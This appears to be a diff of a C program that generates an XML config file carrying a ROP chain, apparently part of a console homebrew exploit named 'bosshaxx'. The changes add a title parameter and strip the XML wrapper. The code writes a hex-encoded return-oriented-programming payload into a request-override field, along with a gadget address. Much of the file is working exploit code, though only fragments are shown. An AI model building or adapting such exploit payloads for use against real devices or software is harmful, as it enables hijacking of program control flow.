@@ -9,9 +9,7 @@
 FILE *fout = NULL;
 
 char configxml_formatstr[] = {
-"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
-<config>\n\
-	<targeturl>\n\
+"	<targeturl required_title=\"0004013000003402,0,%s\">\n\
 		<name>bosshaxx</name>\n\
 		<caps>AddRequestHeader</caps>\n\
 		<url>%s</url>\n\
@@ -24,9 +22,7 @@ char configxml_formatstr[] = {
 			<new_value format=\"hex\">%s</new_value>\n\
 			<new_descriptorword_value>0xbcc</new_descriptorword_value>\n\
 		</requestoverride>\n\
-	</targeturl>\n\
-</config>\n\
-"};
+	</targeturl>\n"};
 
 u32 ROP_POPR0R1R2R3R4R5R6PC = 0x001134d3;
 
@@ -531,7 +527,7 @@ int main(int argc, char **argv)
 
 		for(pos=0; pos<0xbc; pos++)sprintf(&config_hexdata[pos*2], "%02x", (unsigned int)ropchain8[pos]);
 
-		snprintf(configout, configout_size-1, configxml_formatstr, url, new_url, config_hexdata);
+		snprintf(configout, configout_size-1, configxml_formatstr, argv[2], url, new_url, config_hexdata);
 		fprintf(fout, "%s", configout);
 	}
 
